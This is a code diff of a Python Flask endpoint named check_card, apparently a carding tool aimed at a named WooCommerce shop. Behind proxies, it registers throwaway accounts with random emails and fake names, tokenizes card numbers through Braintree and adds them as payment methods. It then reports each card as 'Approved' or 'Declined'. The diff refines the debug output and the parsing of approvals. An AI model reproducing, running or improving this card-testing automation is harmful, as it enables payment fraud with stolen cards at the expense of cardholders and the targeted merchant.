@@ -54,7 +54,7 @@ def check_card():
     proxy_dict = get_proxy_dict(proxy_string)
     
     random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
-    email = f"hunterjsidt{random5}@gmail.com"
+    email = f"hutedjkdkidt{random5}@gmail.com"
     
     first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen"]
     last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee"]
@@ -164,9 +164,9 @@ def check_card():
     match = re.search(r'clientTokenNonce["\']?\s*:\s*["\']([^"\']+)["\']', all_text)
     client_token_nonce = match.group(1) if match else None
 
-    print(checkout)
-    print(updatenonce)
-    print(client_token_nonce)
+    #print(checkout)
+    #print(updatenonce)
+    #print(client_token_nonce)
 
     url = "https://silvercellwireless.com/wp-admin/admin-ajax.php"
     payload = {
@@ -240,7 +240,7 @@ def check_card():
                     token1 = result['data']['tokenizeCreditCard']['token']
 
     if token1:
-        print(token1)
+        #print(token1)
         url = "https://silvercellwireless.com"
         params = {'wc-ajax': "update_order_review"}
         payload = {
@@ -333,7 +333,9 @@ def check_card():
             'priority': "u=1, i",
         }
         response = r.post(url, params=params, data=payload, headers=headers)
-        
+
+        #print(response.text)
+
         url = "https://silvercellwireless.com/my-account/set-password/"
         payload = {
             'new_password': "DDcc55@&#",
@@ -360,7 +362,9 @@ def check_card():
             'priority': "u=0, i",
         }
         response = r.post(url, data=payload, headers=headers)
-        
+
+        #print(response.text)
+
         url = "https://silvercellwireless.com/my-account/add-payment-method/"
         headers = {
             'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
@@ -377,13 +381,13 @@ def check_card():
             'priority': "u=0, i",
         }
         response = r.get(url, headers=headers)
-        
+
+        #print(response.text)
+
         soup = BeautifulSoup(response.text, 'html.parser')
         nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
-        if not nonce_input:
-            return jsonify({'error': 'Add payment method nonce not found'}), 400
-        nonce_value3 = nonce_input['value']
-        
+        nonce_value3 = nonce_input['value'] if nonce_input else None
+
         url = "https://silvercellwireless.com/my-account/add-payment-method/"
         payload = {
             'payment_method': "braintree_credit_card",
@@ -425,30 +429,35 @@ def check_card():
             'priority': "u=0, i",
         }
         response = r.post(url, data=payload, headers=headers)
-        
-        response_text = response.text
-        
-        if re.search(r'(?i)avs', response_text) or re.search(r'(?i)nice', response_text):
-            result = "Approved ✅"
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        error_element = soup.find('ul', class_='woocommerce-error')
+        error_message = None
+        if error_element:
+            li_items = error_element.find_all('li')
+            for li in li_items:
+                text = li.text.strip()
+                if 'Status code' in text or 'error' in text.lower():
+                    error_message = text
+                    break
+            if not error_message and li_items:
+                error_message = li_items[0].text.strip()
+
+        if re.search(r'Avs', response.text) or re.search(r'avs', response.text):
+            result = "Approved-1000 ✅"
+        elif re.search(r'Nice', response.text):
+            result = "Approved-1000 ✅"
+        elif re.search(r'Added', response.text):
+            result = "Approved-1000 ✅"
+        elif re.search(r'Successfully', response.text):
+            result = "Approved-1000 ✅"
+        elif error_message and 'Status code' in error_message:
+            result = f"Declined: {error_message}"
+        elif error_message:
+            result = f"Declined: {error_message}"
         else:
-            soup = BeautifulSoup(response_text, 'html.parser')
-            error_element = soup.find('ul', class_='woocommerce-error')
-            error_message = None
-            if error_element:
-                li_items = error_element.find_all('li')
-                error_messages = []
-                for li in li_items:
-                    text = li.text.strip()
-                    if text:
-                        error_messages.append(text)
-                if error_messages:
-                    error_message = " | ".join(error_messages)
-            
-            if error_message:
-                result = f"Declined ❌: {error_message}"
-            else:
-                result = "Declined ❌: Unknown error"
-        
+            result = "Unknown"
+
         return jsonify({
             'result': result,
             'card': cc,
